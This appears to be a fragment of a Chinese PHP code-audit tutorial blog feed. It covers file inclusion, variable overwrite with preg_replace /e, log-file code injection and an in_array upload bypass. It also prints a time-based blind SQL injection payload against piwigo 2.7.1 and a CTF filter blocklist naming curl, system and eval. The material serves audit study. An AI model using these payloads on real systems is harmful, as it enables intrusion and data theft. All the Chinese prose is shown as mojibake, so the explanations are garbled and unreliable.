<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//action.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;library/common.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;library/view.php&quot;</span>);</span><br><span class="line">$page = filter($_POST[<span class="string">&#x27;page&#x27;</span>]).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">$post_data = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	$post_data[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">require_once</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>POSTä¸€ä¸ª<code>page</code>å˜é‡æ—¶ï¼Œç»è¿‡<code>filter</code>å‡½æ•°å¤„ç†ï¼Œæœ€ååˆ©ç”¨<code>require_once()</code>åŒ…å«è¿›æ¥ã€‚</p>
<p><code>filter()</code>å‡½æ•°äº†è¿‡æ»¤<code>.</code>ï¼Œå¹¶ä¸”é™å®šäº†æ–‡ä»¶åç¼€åä¸º<code>.php</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªç‚¹çš„åˆ©ç”¨æ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼šä½¿ç”¨ç»å¯¹è·¯å¾„çš„æ–¹å¼ä¼ å…¥<code>$page</code>å‚æ•°è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œå¦å¤–ï¼Œå¦‚æœPHPç‰ˆæœ¬å°äº5.4.3ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>%00</code>æˆªæ–­çš„æ–¹å¼è¯»å–ä»»æ„åç¼€åçš„æ–‡ä»¶ã€‚</p>
<p>åˆ©ç”¨æ–¹å¼ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606181932.png" alt=""></p>
<h3 id="normaliz-phpå˜é‡è¦†ç›–"><code>normaliz.php</code>å˜é‡è¦†ç›–</h3>
<p>æ ¹æ®å·¥å…·æ‰«æç»“æœå®¡è®¡<code>normaliz.php</code>æ–‡ä»¶ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// normaliz.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;library/common.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;library/view.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params">$post_data, $ip_replacement, $mail_replacement</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">foreach</span> ($post_data <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">		$$key = $value;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ($method == <span class="string">&#x27;/\\d+\\.\\d+\\.\\d+\\.\\d+/&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			$res = preg_replace($method, $ip_replacement, $source);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			$res = preg_replace($method, $mail_replacement, $source);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)</span><br><span class="line">	&#123;</span><br><span class="line">		write_log($e-&gt;getMessage());</span><br><span class="line">		$res=$source;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line">$view_class = <span class="keyword">new</span> View();</span><br><span class="line">$data = <span class="keyword">array</span>();</span><br><span class="line">$data[<span class="string">&#x27;page&#x27;</span>] = <span class="string">&#x27;normaliz&#x27;</span>;</span><br><span class="line">$ip_replacement = <span class="string">&#x27;222.222.222.222&#x27;</span>;</span><br><span class="line">$mail_replacement = <span class="string">&#x27;lollol@lol.com&#x27;</span>;</span><br><span class="line">$data[<span class="string">&#x27;res&#x27;</span>] = action($post_data, $ip_replacement, $mail_replacement);</span><br><span class="line">$view_class-&gt;echoContent($data[<span class="string">&#x27;page&#x27;</span>], $data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬12è¡Œå’Œ16è¡Œä»£ç çœ‹åˆ°ä¸€ä¸ªæ¯”è¾ƒæ•æ„Ÿçš„å‡½æ•°<code>preg_replace()</code>ï¼Œåœ¨PHP7.0ç‰ˆæœ¬ä¹‹å‰å¯ä»¥ä½¿ç”¨<code>/e</code>æ¨¡å¼æ‰§è¡ŒPHPä»£ç ã€‚</p>
<p>å…¶ä¸­éƒ½éœ€è¦ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼š<code>$method</code>ã€<code>$ip_replacement</code>æˆ–<code>$mail_repalcement</code>ã€<code>$source</code>ï¼Œè¿™ä¸‰ä¸ªå‚æ•°éƒ½å¯ä»¥é€šè¿‡ç¬¬7è¡Œçš„<code>$$</code>æ“ä½œç¬¦è¿›è¡Œå˜é‡è¦†ç›–ã€‚è€Œ<code>post_data</code>å‚æ•°æ˜¯åœ¨<code>action.php</code>é€šè¿‡POSTæ¥èµ‹å€¼ï¼Œé‚£ä¹ˆåˆ©ç”¨æ–¹å¼å°±æ¯”è¾ƒæ¸…æ¥šäº†ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606224027.png" alt=""></p>
<h3 id="common-phpä»»æ„æ–‡ä»¶å†™å…¥"><code>common.php</code>ä»»æ„æ–‡ä»¶å†™å…¥</h3>
<p>é¦–å…ˆçœ‹åˆ°<code>file_put_contents()</code>å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// common.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_log</span>(<span class="params">$input</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $cfg_logfile;</span><br><span class="line">    file_put_contents($cfg_logfile, $input, FILE_APPEND);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¨å±€æŸ¥æ‰¾<code>$cfg_logfile</code>å‚æ•°</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606225336.png" style="zoom:67%;" />
<p>å›æº¯<code>$input</code>å‚æ•°ï¼Œå‘ç°<code>load_file()</code>ä¸­è°ƒç”¨äº†<code>write_log()</code>å‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// common.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadFile</span>(<span class="params">$filePath</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $cfg_basedir;</span><br><span class="line">	<span class="keyword">if</span>(!file_exists($filePath))&#123;</span><br><span class="line">		write_log(<span class="string">&#x27;Try to open Null file:&#x27;</span>.$filePath);</span><br><span class="line">		<span class="keyword">return</span> file_get_contents($cfg_basedir.<span class="string">&#x27;/error.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$fp = @fopen($filePath,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">	$sourceString = @fread($fp,filesize($filePath));</span><br><span class="line">	@fclose($fp);</span><br><span class="line">	<span class="keyword">return</span> $sourceString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å›æº¯<code>$file_path</code>å‚æ•°ï¼Œå‘ç°åœ¨<code>view.php</code>ä¸­çš„<code>echo_content()</code>è°ƒç”¨äº†<code>loadfile()</code>å‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// view.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echoContent</span>(<span class="params">$vId, $data</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">		$content = loadFile(<span class="string">&quot;views/&quot;</span>.$vId.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">		$content = <span class="keyword">$this</span>-&gt;parseHeadAndFoot($content);</span><br><span class="line">		$content = <span class="keyword">$this</span>-&gt;parseVal($content);</span><br><span class="line">		$content = <span class="keyword">$this</span>-&gt;parseIf($content);</span><br><span class="line">		<span class="keyword">echo</span> $content;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>æ¥ç€å›æº¯<code>$vId</code>å‚æ•°ï¼ŒæŸ¥çœ‹<code>echoContent()</code>å‡½æ•°çš„è°ƒç”¨æƒ…å†µï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606230150.png" style="zoom:67%;" />
<p>ä¸»è¦æ˜¯åˆ†ä¸¤å¤§ç±»ï¼š</p>
<ol>
<li><code>phpcom.php</code>ã€<code>md5.php</code>å’Œ<code>normaliz.php</code>éƒ½æ˜¯åœ¨<code>action.php</code>ä¸­é€šè¿‡ä¼ å…¥pageå˜é‡ï¼Œä»è€ŒåŒ…å«è¿›æ¥çš„ï¼Œæ•…ä¸å¯æ§ï¼›</li>
<li><code>index.php</code>ä¸‹ä¼ å…¥çš„æ˜¯pageå˜é‡</li>
</ol>
<p>é‚£ä¸ªå°±å¯ä»¥é€šè¿‡GETæ–¹å¼ç»™<code>page</code>å˜é‡èµ‹å€¼ï¼Œå†™å…¥æ–‡ä»¶å†…å®¹ï¼Œç„¶åé€šè¿‡<code>write_log()</code>å‡½æ•°å†™å…¥<code>logfile.php</code>æ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨æ–¹å¼ï¼š</p>
<p>å…ˆå†™å…¥<code>&lt;?php phpinfo(); ?&gt;</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606231535.png" alt=""></p>
<p>æ¥ç€é€šè¿‡<code>action.php</code>æ–‡ä»¶åŒ…å«æ¥æ‰§è¡Œå‘½ä»¤ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606231812.png" alt=""></p>
<blockquote>
<p>å…¶å®è¿™é‡Œç”¨phpæ–‡ä»¶å»å­˜å‚¨æ—¥å¿—å°±å¾ˆç¦»è°±ã€‚</p>
</blockquote>
<h3 id="view-phpä»£ç æ‰§è¡Œ"><code>view.php</code>ä»£ç æ‰§è¡Œ</h3>
<p>è¿™ä¸ªç‚¹è¿˜æ˜¯æ¯”è¾ƒæœ‰éš¾åº¦çš„</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606234400.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606235724.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606235830.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606235923.png" alt=""></p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day1</title>
    <url>/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1/</url>
    <content><![CDATA[<h1 id="PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day1-in-arrayå‡½æ•°ç¼ºé™·">PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day1 in_arrayå‡½æ•°ç¼ºé™·</h1>
<blockquote>
<p>å­¦ä¹ èµ„æºå‡æ¥è‡ªäº<a href="https://mochazz.github.io/">mochazz</a>å¸ˆå‚…ï¼Œæ„Ÿè°¢çº¢æ—¥å®‰å…¨ä»£ç å®¡è®¡å°ç»„çš„åˆ†äº«</p>
</blockquote>
<h2 id="0x01-Day1-Wish-List">0x01 Day1 - Wish List</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">&#x27;./solutions/&#x27;</span>;</span><br><span class="line">  <span class="keyword">private</span> $file;</span><br><span class="line">  <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;name&#x27;</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">      move_uploaded_file(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;tmp_name&#x27;</span>],</span><br><span class="line">        <span class="built_in">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">&#x27;solution&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸€å…³å¡è€ƒå¯Ÿçš„æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä¸»è¦é—®é¢˜å‡ºåœ¨<code>in_array</code>å‡½æ•°ï¼Œæ¥çœ‹å®˜æ–¹æ–‡æ¡£å¯¹è¿™ä¸ªå‡½æ•°çš„è§£é‡Šï¼š</p>
<blockquote>
<p>in_array (PHP 4, PHP 5, PHP 7)</p>
<p>åŠŸèƒ½ï¼šæ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼</p>
<p>å®šä¹‰ï¼šin_array ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$needle</code> , array <code>$haystack</code> [, bool <code>$strict</code> = <strong><code>FALSE</code></strong> ] ) : bool</p>
<p>åœ¨ <strong>$haystack</strong> ä¸­æœç´¢ <strong>$needle</strong> ï¼Œå¦‚æœç¬¬ä¸‰ä¸ªå‚æ•° <strong>$strict</strong> çš„å€¼ä¸º <strong>TRUE</strong> ï¼Œåˆ™ <strong>in_array()</strong> å‡½æ•°ä¼šè¿›è¡Œå¼ºæ£€æŸ¥ï¼Œæ£€æŸ¥ <strong>$needle</strong> çš„ç±»å‹æ˜¯å¦å’Œ <strong>$haystack</strong> ä¸­çš„ç›¸åŒã€‚å¦‚æœæ‰¾åˆ° <strong>$haystack</strong> ï¼Œåˆ™è¿”å› <strong>TRUE</strong>ï¼Œå¦åˆ™è¿”å› <strong>FALSE</strong>ã€‚</p>
</blockquote>
<p>ç”±äºè¯¥å‡½æ•°å¹¶æœªå°†ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸ºï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤å¤„æ„é€ æ–‡ä»¶åä¸º7shell.phpï¼Œ<code>in_array()</code>å‡½æ•°ä¼šå°†7shell.phpå¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—7ï¼Œæ•°å­—7åœ¨<code>$this-&gt; whitelist</code>ä¹Ÿå°±æ˜¯æ•°ç»„çš„1-24ä¸­ï¼Œç»•è¿‡<code>in_array()</code>çš„å‡½æ•°åˆ¤æ–­ï¼Œå¯ä»¥æ„é€ ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200609164117.png" alt=""></p>
<h2 id="0x02-å®ä¾‹åˆ†æ-piwigo2-7-1">0x02 å®ä¾‹åˆ†æ - piwigo2.7.1</h2>
<p>é¦–å…ˆå®‰è£…å¥½ç½‘ç«™åï¼Œéšä¾¿å‘å¸ƒä¸€å¼ å›¾ç‰‡ï¼Œæ¼æ´çš„å…¥å£æ–‡ä»¶åœ¨ <code>picture.php</code> ä¸­ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// picture.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ($_GET[<span class="string">&#x27;action&#x27;</span>])</span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rate&#x27;</span> :</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">include_once</span>(PHPWG_ROOT_PATH.<span class="string">&#x27;include/functions_rate.inc.php&#x27;</span>);</span><br><span class="line">      rate_picture($page[<span class="string">&#x27;image_id&#x27;</span>], $_POST[<span class="string">&#x27;rate&#x27;</span>]);</span><br><span class="line">      redirect($url_self);</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>å½“<code> $_GET[â€˜actionâ€™]</code> ä¸º <strong>rate</strong> çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨æ–‡ä»¶ <code>include/functions_rate.inc.php</code> ä¸­çš„ <code>rate_picture</code> æ–¹æ³•ï¼Œè€Œæ¼æ´ä¾¿å­˜åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ã€‚</p>
<p>è·Ÿå…¥<code>rate_picture</code> å‡½æ•¸ï¼Œå‡½æ•°å¯¹ <code>$rate</code> å˜é‡è¿›è¡Œæ£€æµ‹ï¼Œåˆ¤æ–­ â€‹<code>rate</code> æ˜¯å¦åœ¨ â€‹<code>$conf[â€˜rate_itemsâ€™]</code> ä¸­ï¼Œ â€‹<code>$conf[â€˜rate_itemsâ€™]</code> çš„å†…å®¹å¯ä»¥åœ¨<code> include\config_default.inc.php</code> ä¸­æ‰¾åˆ°ï¼Œä¸º <code>$conf['rate_items'] = array(0,1,2,3,4,5);</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rate_picture</span>(<span class="params">$image_id, $rate</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $conf, $user;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>($rate)</span><br><span class="line">      <span class="keyword">or</span> !$conf[<span class="string">&#x27;rate&#x27;</span>]</span><br><span class="line">      <span class="keyword">or</span> !in_array($rate, $conf[<span class="string">&#x27;rate_items&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $user_anonymous = is_autorize_status(ACCESS_CLASSIC) ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ($user_anonymous <span class="keyword">and</span> !$conf[<span class="string">&#x27;rate_anonymous&#x27;</span>])</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">  $query = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">  INTO &#x27;</span>.RATE_TABLE.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  (user_id,anonymous_id,element_id,rate,date)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  (&#x27;</span></span><br><span class="line">    .$user[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="string">&#x27;\&#x27;&#x27;</span>.$anonymous_id.<span class="string">&#x27;\&#x27;,&#x27;</span></span><br><span class="line">    .$image_id.<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .$rate</span><br><span class="line">    .<span class="string">&#x27;,NOW())</span></span><br><span class="line"><span class="string">;&#x27;</span>;</span><br><span class="line">  pwg_query($query);</span><br></pre></td></tr></table></figure>
<p>ç”±äºè¿™é‡Œï¼ˆç¬¬7è¡Œï¼‰å¹¶æ²¡æœ‰å°† <code>in_array()</code> å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º <code>true</code> ï¼Œæ‰€ä»¥ä¼šè¿›è¡Œå¼±æ¯”è¾ƒï¼Œå¯ä»¥ç»•è¿‡ã€‚æ¯”å¦‚æˆ‘ä»¬å°† <code>$rate</code> çš„å€¼è®¾ç½®æˆ <code>1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#</code> é‚£ä¹ˆSQLè¯­å¥å°±å˜æˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO piwigo_rate (user_id,anonymous_id,element_id,rate,date) VALUES (2,&#39;192.168.2&#39;,1,1,1 and if(ascii(substr((select database()),1,1))&#x3D;112,1,sleep(3)));#,NOW()) ;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-ç»ƒä¹ é¢˜">0x03  ç»ƒä¹ é¢˜</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;SELECT COUNT(*) FROM users&quot;</span>;</span><br><span class="line">$whitelist = <span class="keyword">array</span>();</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $whitelist = range(<span class="number">1</span>, $row[<span class="string">&#x27;COUNT(*)&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = stop_hack($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($id, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;id <span class="subst">$id</span> is not in whitelist.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($row <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&lt;center&gt;<span class="subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line">$password = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line">$dbname = <span class="string">&quot;day1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">	$pattern = <span class="string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;</span><br><span class="line">	$back_list = explode(<span class="string">&quot;|&quot;</span>,$pattern);</span><br><span class="line">	<span class="keyword">foreach</span>($back_list <span class="keyword">as</span> $hack)&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$hack</span>/i&quot;</span>, $value))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$hack</span> detected!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ­å»ºCTFç¯å¢ƒä½¿ç”¨çš„sqlè¯­å¥</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> day1;</span><br><span class="line"><span class="keyword">use</span> day1;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">6</span>) <span class="keyword">unsigned</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">email <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">salary <span class="built_in">int</span>(<span class="number">8</span>) <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">null</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Lucia&#x27;</span>,<span class="string">&#x27;Lucia@hongri.com&#x27;</span>,<span class="number">3000</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;Danny&#x27;</span>,<span class="string">&#x27;Danny@hongri.com&#x27;</span>,<span class="number">4500</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;Alina&#x27;</span>,<span class="string">&#x27;Alina@hongri.com&#x27;</span>,<span class="number">2700</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;Jameson&#x27;</span>,<span class="string">&#x27;Jameson@hongri.com&#x27;</span>,<span class="number">10000</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;Allie&#x27;</span>,<span class="string">&#x27;Allie@hongri.com&#x27;</span>,<span class="number">6000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> flag(flag <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> flag <span class="keyword">VALUES</span>(<span class="string">&#x27;HRCTF&#123;1n0rrY_i3_Vu1n3rab13&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>
